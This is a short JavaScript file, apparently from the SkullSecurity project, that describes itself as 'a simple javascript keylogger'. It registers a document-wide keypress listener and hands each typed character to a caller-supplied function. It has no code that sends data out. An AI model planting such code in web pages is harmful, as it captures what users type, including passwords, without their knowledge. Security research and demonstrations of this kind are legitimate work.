/*
 * skullsecurity.min.js
 * By Stefan Penner
 * Created December, 2009
 *
 * (See LICENSE.txt)
 *
 * A simple javascript keylogger
 */

var SkullSecurity = SkullSecurity || {};

(function(lib){
  lib.attachEvent = function( elem, type, handle ) { 
  // IE #fail
    if ( elem.addEventListener ){
      elem.addEventListener(type, handle, false);
    }else if(elem.attachEvent){
      elem.attachEvent("on"+type,handle);
    }
  }
})(SkullSecurity);

(function(lib){
  lib.keylogger = lib.keylogger || {};
  lib.keylogger.start = function(fcn){
    lib.attachEvent(document,'keypress',function(event){

      if (!event) event = window.event; // ie #fail
      var code = String.fromCharCode(event.charCode);
      fcn.call(event,code);
    });
  };
})(SkullSecurity);
